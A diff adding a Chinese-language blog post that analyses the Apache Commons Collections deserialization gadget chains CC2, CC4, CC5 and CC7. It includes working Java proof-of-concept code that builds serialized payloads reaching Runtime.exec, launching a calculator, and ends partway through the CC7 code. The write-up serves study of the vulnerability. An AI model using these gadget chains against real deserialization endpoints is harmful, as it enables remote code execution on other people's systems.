@@ -1,0 +1,736 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CC2,4,5,7反序列化链 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CC2,4,5,7反序列化链 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="commons-collections2反序列化链分析
+整体分析
+前几天分析了CC1,CC3,CC6，现在来分析一下CC2，CC2个人感觉还是比较简单的，一看就懂，整条链也不怎么长，但是他是的commons-collections版本是4...." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CC2,4,5,7反序列化链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                23 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="commons-collections2反序列化链分析">commons-collections2反序列化链分析</h1>
+<h2 id="整体分析">整体分析</h2>
+<p>前几天分析了CC1,CC3,CC6，现在来分析一下CC2，CC2个人感觉还是比较简单的，一看就懂，整条链也不怎么长，但是他是的commons-collections版本是4.0。我们首先来看一下ysoserial源码里的Gadget<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172715060.png" alt="image-20220411172715060" loading="lazy"></p>
+<p>他这里中间的链用省略号了，那我们自己来摸索一下吧，我这里先把最终的结果的整条链子发出来</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172735712.png" alt="image-20220411172735712" loading="lazy"></figure>
+<h2 id="细节分析">细节分析</h2>
+<p>这里的话后面还是不分析了，因为他这里最终也是到InvokerTransformer.transform，所以前面那部分依旧不变</p>
+<pre><code class="language-java">        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+</code></pre>
+<p>接下来我们要去寻找调用transform方法的位置，这里找到TransformingComparator的compare方法</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172747223.png" alt="image-20220411172747223" loading="lazy"></figure>
+<p>这里在compare方法里调用了this.transformer的transform方法，并且构造函数是public，我们只需要传入一个Transformer对象即可，这里传入的Transformer对象其实就是我们对应的chainedTransformer，因为这样的话他就会调用chainedTransformer的transform方法，接下来我们要寻找调用compare方法的位置</p>
+<p>这里找到PriorityQueue的siftDownUsingComparator()方法，这里其实是通过PriorityQueue的readObject方法，一步步往下找找到的这个方法</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172753873.png" alt="image-20220411172753873" loading="lazy"></figure>
+<p>他这里是调用了自身属性comparator的compare方法，我们要想让他去调用TransformingComparator的compare方法，就需要让他的comparator是一个TransformingComparator类的对象,所以到这里已经很明显了，可以直接上手写POC了，这里还有一个点，就是在heapify方法内，需要满足i=(size&gt;&gt;&gt;1)-1，所以传入的size至少得是2，才能走到siftDown</p>
+<p>所以我们可以写出来poc</p>
+<pre><code class="language-java">import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.util.PriorityQueue;
+
+public class cc2 {
+    public static void main(String[] args)  throws Exception{
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(100,transformingComparator);
+        queue.add(100);
+        queue.add(222);
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+
+</code></pre>
+<p>但是这里问题来了，我们用这个poc进行序列化，也会弹出计算器，这就很搞人心态了。按理来说是应该反序列化以后才能弹出计算器，但是他这在序列化前就弹出计算器了，说明提前触发了，这里的话我发现是貌似在add的时候，触发了siftUpUsingComparator方法，siftUpUsingComparator方法里也有comparator.compare，所以在这提前触发了<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172802852.png" alt="image-20220411172802852" loading="lazy"></p>
+<p>其实解决办法也是比较简单的，就和前面的那条链一样，他提前触发，我只要先放个假的transformer，然后让他触发完再放入真的即可，改进后的poc如下</p>
+<pre><code class="language-java">import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class cc2 {
+    public static void main(String[] args)  throws Exception{
+        Transformer[] faketransformer=new Transformer[]{new ConstantTransformer(1)};
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(faketransformer);
+        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(100,transformingComparator);
+        queue.add(100);
+        queue.add(222);
+        Class s=ChainedTransformer.class;
+        Field iTransformersField = s.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformersField.setAccessible(true);
+        iTransformersField.set(chainedTransformer,transformers);
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+
+</code></pre>
+<h1 id="commons-collections4反序列化链分析">commons-collections4反序列化链分析</h1>
+<p>在ysoserial的源码中是这样描述的，大概意思是不同于CC2的地方是用InstantiateTransformer替换了InvokerTransformer，InstantiateTransformer都比较熟悉，在CC3中我们曾经使用过。</p>
+<pre><code> * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
+ * InvokerTransformer.
+</code></pre>
+<p>所以说，这里其实就是把CC2的poc用加载字节码的方法去修改一下即可，下面直接给出poc</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class cc4 {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates=new TemplatesImpl();
+        Class tc=templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] code= Files.readAllBytes(Paths.get(&quot;D://class/demo.class&quot;));
+        byte[][] codes= {code};
+        bytecodesField.set(templates,codes);
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                instantiateTransformer,
+        };
+        Transformer[] fakeTransformer=new Transformer[]{new ConstantTransformer(1)};
+        ChainedTransformer chainedTransformer=new ChainedTransformer(fakeTransformer);
+        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2,transformingComparator);
+        queue.add(111);
+        queue.add(222);
+
+        Class s=ChainedTransformer.class;
+        Field iTransformersField = s.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformersField.setAccessible(true);
+        iTransformersField.set(chainedTransformer,transformers);
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+
+</code></pre>
+<p>CC2和CC4的区别不同就在于链子末尾不同，起点都是一样的。所以我们只要把之前的InvokerTransformer那部分用InstantiateTransformer替换即可</p>
+<h1 id="commons-collections5反序列化链分析">commons-collections5反序列化链分析</h1>
+<p>首先还是继续看ysoserial源码，具体调用链如下</p>
+<pre><code>	Gadget chain:
+        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre>
+<p>可以看到，从LazyMap到结尾已经很熟悉了，我这里就不赘述了，直接开始看剩下的。</p>
+<p>这里的话还是需要找到是谁调用了LazyMap的get方法，</p>
+<p>在BadAttributeValueExpException的readObject中调用了toString，这里是valObj是获取val属性的值，然后执行valObj.toString，这里的话我们下一步要执行TiedMapEntry.toString，所以让这里的val是一个TiedMapEntry对象即可</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172812425.png" alt="image-20220411172812425" loading="lazy"></figure>
+<p>转到TiedMapEntry的toString方法，发现他里面是调用了自身的getValue方法</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172818612.png" alt="image-20220411172818612" loading="lazy"></figure>
+<p>跳转到getValue方法，调用了自身map属性的get方法，这里的话也就一眼能看出来了，我们只要让他的map属性的值是一个LazyMap的的对象，那么这整条链就走得通了</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172823945.png" alt="image-20220411172823945" loading="lazy"></figure>
+<p>接下来可以直接写poc，在LazyMap.get()之后的内容还是和之前的CC1的写法一样，然后剩余的就是要new一个BadAttributeValueExpException对象，构造函数如下，需要传入一个val值，这里其实是有个小坑，我们后面再说</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172836248.png" alt="image-20220411172836248" loading="lazy"></figure>
+<p>正常来说我们是要使用BadAttributeValueExpException类的readObject方法作为链子的起点，所以我们应该序列化new出来的BadAttributeValueExpException对象，让他去调用valObj.toString()，但是这里是有个条件，他得jin'ru进入第二个else if，所以我们这里构造方法传入val必须不为空，并且不是一if里面那些类的对象，然后valObj是获得val的值，所以我们这里传入的BadAttributeValueExpException刚好满足条件</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172844355.png" alt="image-20220411172844355" loading="lazy"></figure>
+<p>根据如上分析，我们需要new一个BadAttributeValueExpException把BadAttributeValueExpException类的对象作为构造函数的参数传入即可，写出POC如下</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc5 {
+    public static void main(String[] args) throws Exception{
+        org.apache.commons.collections.Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();
+        Map lazyMap=LazyMap.decorate(hashMap,chainedTransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;1&quot;);
+        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
+        serialize(badAttributeValueExpException);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>跑一下会发现，在序列化的时候就弹出了计算器，这就有意思了，其实这就是我上面说的那个小坑</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172852012.png" alt="image-20220411172852012" loading="lazy"></figure>
+<p>我们可以来重新看一下他的构造函数，他这里使用了一个三目运算符，他如果传入val不是空，马上就调用了val.toString方法，这里的话就提前触发了我们的命令执行的功能，所以还是和之前几条链的思路一样，传的时候先传一个null进去，然后再利用反射进行替换即可</p>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172858971.png" alt="image-20220411172858971" loading="lazy"></figure>
+<p>最终poc如下</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc5 {
+    public static void main(String[] args) throws Exception{
+        org.apache.commons.collections.Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();
+        Map lazyMap=LazyMap.decorate(hashMap,chainedTransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;1&quot;);
+        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
+        Class c=BadAttributeValueExpException.class;
+        Field valField = c.getDeclaredField(&quot;val&quot;);
+        valField.setAccessible(true);
+        valField.set(badAttributeValueExpException,tiedMapEntry);
+        serialize(badAttributeValueExpException);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+
+</code></pre>
+<h1 id="commons-collections7反序列化链分析">commons-collections7反序列化链分析</h1>
+<p>终于到cc7了，这条链讲完就是CC系列的完结了，这条链我个人觉得有意思，比前面的几条要难以理解一点，所以先给出poc，根据poc进行分析吧。老规矩先来ysoserial看一下他的调用链吧<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172908745.png" alt="image-20220411172908745" loading="lazy"></p>
+<p>后面的部分其实还是差不多，调用lazymap的get方法，主要是前面的内容，我们可以首先来看一下Hashtable的序列化的过程，就是看他人writeObject方法</p>
+<pre><code class="language-java">    private void writeObject(java.io.ObjectOutputStream s)
+            throws IOException {
+        Entry&lt;Object, Object&gt; entryStack = null;
+
+        synchronized (this) {
+            // Write out the length, threshold, loadfactor
+            s.defaultWriteObject();
+
+            // Write out length, count of elements
+            s.writeInt(table.length);
+            s.writeInt(count);
+
+            // Stack copies of the entries in the table
+            for (int index = 0; index &lt; table.length; index++) {
+                Entry&lt;?,?&gt; entry = table[index];
+
+                while (entry != null) {
+                    entryStack =
+                        new Entry&lt;&gt;(0, entry.key, entry.value, entryStack);
+                    entry = entry.next;
+                }
+            }
+        }
+
+        // Write out the key/value objects from the stacked entries
+        while (entryStack != null) {
+            s.writeObject(entryStack.key);
+            s.writeObject(entryStack.value);
+            entryStack = entryStack.next;
+        }
+    }
+</code></pre>
+<p>这里的话他进行序列化，首先写入了table的长度以及table的元素个数，然后取出table中的元素，放入entryStack，这里其实就是栈，然后把栈里面的每个元素用writeObject写入。</p>
+<p>我们再来看一下他的反序列化的流程</p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+         throws IOException, ClassNotFoundException
+    {
+        // Read in the length, threshold, and loadfactor
+        s.defaultReadObject();
+
+        // Read the original length of the array and number of elements
+        int origlength = s.readInt();
+        int elements = s.readInt();
+
+        // Compute new size with a bit of room 5% to grow but
+        // no larger than the original size.  Make the length
+        // odd if it's large enough, this helps distribute the entries.
+        // Guard against the length ending up zero, that's not valid.
+        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
+        if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)
+            length--;
+        if (origlength &gt; 0 &amp;&amp; length &gt; origlength)
+            length = origlength;
+        table = new Entry&lt;?,?&gt;[length];
+        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
+        count = 0;
+
+        // Read the number of elements and then all the key/value objects
+        for (; elements &gt; 0; elements--) {
+            @SuppressWarnings(&quot;unchecked&quot;)
+                K key = (K)s.readObject();
+            @SuppressWarnings(&quot;unchecked&quot;)
+                V value = (V)s.readObject();
+            // synch could be eliminated for performance
+            reconstitutionPut(table, key, value);
+        }
+    }
+</code></pre>
+<p>首先先读取了table数组的容量和元素个数，然后根据origlength和elements算出table的长度，后面就根据length创建table数组，反序列化的时候依次读取每个key和value，用reconstitutionPut方法放入table数组，接下来来看reconstitutionPut方法</p>
+<pre><code class="language-java">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+    throws StreamCorruptedException
+{
+    if (value == null) {
+        throw new java.io.StreamCorruptedException();
+    }
+    // Makes sure the key is not already in the hashtable.
+    // This should not happen in deserialized version.
+    int hash = key.hashCode();
+    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
+            throw new java.io.StreamCorruptedException();
+        }
+    }
+    // Creates the new entry.
+    @SuppressWarnings(&quot;unchecked&quot;)
+        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+    tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+    count++;
+}
+</code></pre>
+<p>首先判断value是否为空，为空抛出异常，然后重写计算了hash和下标，并且判断是否有元素重复，如果不重复的话，会把元素转换成Entry然后放到tab数组里，这里主要是在e.key.equals(key)触发，但是走到这需要两个元素，因为只他要进行比较，一个元素没法进行比较，并且这俩元素的hash也要相同e.key.equals(key)这个函数其实调用了LazyMap的equals，但是LazyMap本身是没有equals这个方法，这个方法来源于他继承的抽象类AbstractMapDecorator</p>
+<pre><code class="language-java">public boolean equals(Object object) {
+    if (object == this) {
+        return true;
+    }
+    return map.equals(object);
+}
+</code></pre>
+<p>首先先判断了一下是否是同一对象，然后去调用map.equals(object)方法，这里的map其实就是LazyMap通过decorate把HashMap传给了他，所以这里其实是调用了HashMap的equals方法，但是HashMap继承了AbstractMap抽象类，这个抽象类中有equals方法</p>
+<pre><code class="language-java">public boolean equals(Object o) {
+    if (o == this)
+        return true;
+
+    if (!(o instanceof Map))
+        return false;
+    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+    if (m.size() != size())
+        return false;
+
+    try {
+        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+        while (i.hasNext()) {
+            Entry&lt;K,V&gt; e = i.next();
+            K key = e.getKey();
+            V value = e.getValue();
+            if (value == null) {
+                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                    return false;
+            } else {
+                if (!value.equals(m.get(key)))
+                    return false;
+            }
+        }
+    } catch (ClassCastException unused) {
+        return false;
+    } catch (NullPointerException unused) {
+        return false;
+    }
+
+    return true;
+}
+</code></pre>
+<p>他首先在第一个if判断了是否是同一对象，在第二个if判断运行类型是否不是Map，然后强制转换成Map，然后还得判断Map中元素的个数，然后就是使用迭代器遍历每个元素，获取到每个key和value，如果value不是null，会调用m.get(key)，这里m的本质上是LazyMap，所以就成功调用到了LazyMap的get方法啊。</p>
+<p>但是有意思的一点是，在ysoserial中最后调用了lazyMap2.remove(&quot;yy&quot;);这是为什么呢？其实和前面几条链类似，在使用hashtable.put(lazyMap2,2)的时候，lazyMap2会调用AbstractMap抽象类的equals方法，equals内部会调用lazyMap2的get方法判断table中元素key在lazyMap2是否存在，如果不存在会put进去。</p>
+<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172917546.png" alt="image-20220411172917546" loading="lazy"></figure>
+<p>在反序列化的时候AbstractMap抽象类的equals会在第三个if判断中会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞</p>
+<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172951017.png" alt="image-20220411172951017" loading="lazy"></figure>
+<p>除此之外，要触发这条链，还有一个条件就是构造利用链的时候必须添加两个hash一样的元素，下面来分析一下吧。</p>
+<pre><code class="language-java">public synchronized V put(K key, V value) {
+    // Make sure the value is not null
+    if (value == null) {
+        throw new NullPointerException();
+    }
+
+    // Makes sure the key is not already in the hashtable.
+    Entry&lt;?,?&gt; tab[] = table;
+    int hash = key.hashCode();
+    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+    @SuppressWarnings(&quot;unchecked&quot;)
+    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];
+    for(; entry != null ; entry = entry.next) {
+        if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) {
+            V old = entry.value;
+            entry.value = value;
+            return old;
+        }
+    }
+
+    addEntry(hash, key, value, index);
+    return null;
+}
+</code></pre>
+<p>他这要满足entry.hash == hash，hash是通过key.hashcode来赋值的，我们传入的key是一个LazyMap，所以得去找LazyMap的hashcode方法，他本身是没有hashcode方法，但是他继承了AbstractMap类，所以会调用AbstractMap类的hashcode方法。</p>
+<pre><code class="language-java">public int hashCode() {
+    int h = 0;
+    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+    while (i.hasNext())
+        h += i.next().hashCode();
+    return h;
+}
+</code></pre>
+<p>他这里又通过遍历去调用元素的hashcode方法，其实是Node节点的hashCode方法<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172959162.png" alt="image-20220411172959162" loading="lazy"></p>
+<p>我们跳到HashMap的内部类Node的hashCode方法来看看</p>
+<pre><code>public final int hashCode() {
+    return Objects.hashCode(key) ^ Objects.hashCode(value);
+}
+</code></pre>
+<p>他是先调用Object类的hashCode方法计算出来一个值，然后再用key和value通过Object类的hashCode方法计算出来的值进行异或运算得到一个新的值，继续根据Objects.hashCode</p>
+<figure data-type="image" tabindex="13"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173004870.png" alt="image-20220411173004870" loading="lazy"></figure>
+<p>可以看到，实际上底层调用了字符串“yy”的包装类String的hashCode方法，我们继续跟进到String的hashCode方法，可以看到，第一次算的时候是val[i]是y，ascii是121，h就是121，第二次是y，就是121*31+121也就是3872</p>
+<pre><code class="language-java">public int hashCode() {
+    int h = hash;
+    if (h == 0 &amp;&amp; value.length &gt; 0) {
+        char val[] = value;
+
+        for (int i = 0; i &lt; value.length; i++) {
+            h = 31 * h + val[i];
+        }
+        hash = h;
+    }
+    return h;
+}
+</code></pre>
+<p>然后回到Node类中的hashCode方法，进行异或运算得到一个3873新的hash值并返回到AbstractMap类的hashCode方法中，最终lazyMap1的hash值就是3873</p>
+<p>lazyMap2也是同理，这里的话yy和zZ都是精心构造的，也可以换成Ea和FB</p>
+<p>POC如下：</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class cc7test {
+    public static void main(String[] args) throws Exception {
+        Transformer transformerChain = new ChainedTransformer(new Transformer[0]);
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
